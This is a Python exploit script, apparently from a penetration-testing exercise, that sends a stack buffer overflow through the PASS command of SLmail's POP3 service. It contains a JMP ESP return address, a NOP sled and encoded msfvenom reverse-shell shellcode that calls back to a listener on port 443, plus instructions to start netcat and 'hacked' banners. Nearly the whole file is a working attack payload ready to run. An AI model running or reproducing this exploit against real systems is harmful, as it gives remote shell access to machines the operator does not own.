#!/usr/bin/python

# coding=utf-8



import time, struct, sys

import socket as so



anonymous = (

"\n"

"  █████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█\n"

"  ██▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█\n"

"  █▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"

"  ██▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"

"  █▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█\n"

"  ██████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█\n"

"  █▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"

"  ██▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"

"  █▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"

"  ███▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"

"  ███▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"

"  ███▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"

"  ██▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"

"  ██▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██\n"

"  ███▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██\n"

"  ███▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███\n"

"  ████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███\n"

"  █████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████\n"

"  █████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████\n"

"  ██████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████\n"

"  ███████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████\n"

"  ████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████\n"

"  █████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████\n"

"  █████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬█████████\n"

"  █████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████\n")



hacked = (        

"    | |              | |          | |\n"

"    | |__   __ _  ___| | _____  __| |\n"

"    | '_ \ / _` |/ __| |/ / _ \/ _` |\n"

"    | | | | (_| | (__|   <  __/ (_| |\n"

"    |_| |_|\__,_|\___|_|\_\___|\__,_|\n\n
By James")



achars = 'A'*2606



#JMP ESP address is 5F4A358F

jmpesp = '\x8f\x35\x4a\x5f'



#NOP Sled

nops = '\x90'*16



#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.100 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT

#port 443



buf =  b""

buf += b"\xdb\xcb\xba\x75\xef\x43\xeb\xd9\x74\x24\xf4\x5e\x33"

buf += b"\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x9b\x13\xa1"

buf += b"\x1e\x9f\x04\xa4\xe1\x5f\xd5\xc9\x68\xba\xe4\xc9\x0f"

buf += b"\xcf\x57\xfa\x44\x9d\x5b\x71\x08\x35\xef\xf7\x85\x3a"

buf += b"\x58\xbd\xf3\x75\x59\xee\xc0\x14\xd9\xed\x14\xf6\xe0"

buf += b"\x3d\x69\xf7\x25\x23\x80\xa5\xfe\x2f\x37\x59\x8a\x7a"

buf += b"\x84\xd2\xc0\x6b\x8c\x07\x90\x8a\xbd\x96\xaa\xd4\x1d"

buf += b"\x19\x7e\x6d\x14\x01\x63\x48\xee\xba\x57\x26\xf1\x6a"

buf += b"\xa6\xc7\x5e\x53\x06\x3a\x9e\x94\xa1\xa5\xd5\xec\xd1"

buf += b"\x58\xee\x2b\xab\x86\x7b\xaf\x0b\x4c\xdb\x0b\xad\x81"

buf += b"\xba\xd8\xa1\x6e\xc8\x86\xa5\x71\x1d\xbd\xd2\xfa\xa0"

buf += b"\x11\x53\xb8\x86\xb5\x3f\x1a\xa6\xec\xe5\xcd\xd7\xee"

buf += b"\x45\xb1\x7d\x65\x6b\xa6\x0f\x24\xe4\x0b\x22\xd6\xf4"

buf += b"\x03\x35\xa5\xc6\x8c\xed\x21\x6b\x44\x28\xb6\x8c\x7f"

buf += b"\x8c\x28\x73\x80\xed\x61\xb0\xd4\xbd\x19\x11\x55\x56"

buf += b"\xd9\x9e\x80\xf9\x89\x30\x7b\xba\x79\xf1\x2b\x52\x93"

buf += b"\xfe\x14\x42\x9c\xd4\x3c\xe9\x67\xbf\xee\xf3\x0e\x5d"

buf += b"\x87\x09\xd0\xa0\xec\x87\x36\xc8\x02\xce\xe1\x65\xba"

buf += b"\x4b\x79\x17\x43\x46\x04\x17\xcf\x65\xf9\xd6\x38\x03"

buf += b"\xe9\x8f\xc8\x5e\x53\x19\xd6\x74\xfb\xc5\x45\x13\xfb"

buf += b"\x80\x75\x8c\xac\xc5\x48\xc5\x38\xf8\xf3\x7f\x5e\x01"

buf += b"\x65\x47\xda\xde\x56\x46\xe3\x93\xe3\x6c\xf3\x6d\xeb"

buf += b"\x28\xa7\x21\xba\xe6\x11\x84\x14\x49\xcb\x5e\xca\x03"

buf += b"\x9b\x27\x20\x94\xdd\x27\x6d\x62\x01\x99\xd8\x33\x3e"

buf += b"\x16\x8d\xb3\x47\x4a\x2d\x3b\x92\xce\x5d\x76\xbe\x67"

buf += b"\xf6\xdf\x2b\x3a\x9b\xdf\x86\x79\xa2\x63\x22\x02\x51"

buf += b"\x7b\x47\x07\x1d\x3b\xb4\x75\x0e\xae\xba\x2a\x2f\xfb"



overflow = achars + jmpesp + nops + buf



try:

   server = str(sys.argv[1])

   port = int(sys.argv[2])

except IndexError:

   print ("[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0])

   print("Make sure to use netcat first. Example: nc -nlvp 443")

   sys.exit()



s = so.socket(so.AF_INET, so.SOCK_STREAM)

print ("\n[+] Attempting to send buffer overflow to SLmail....")

try:

   s.connect((server,port))

   s.recv(1024)

   s.send('USER James' +'\r\n')

   s.recv(1024)

   s.send('PASS ' + overflow + '\r\n')

   print ("\n[+] Completed. Check netcat for shell.")

   print ("\033[1;32;48m" + anonymous)

   print (hacked)

   print("By James ")

except:

   print ("[+] Unable to connect to SLmail. Check your IP address and port")

   sys.exit()

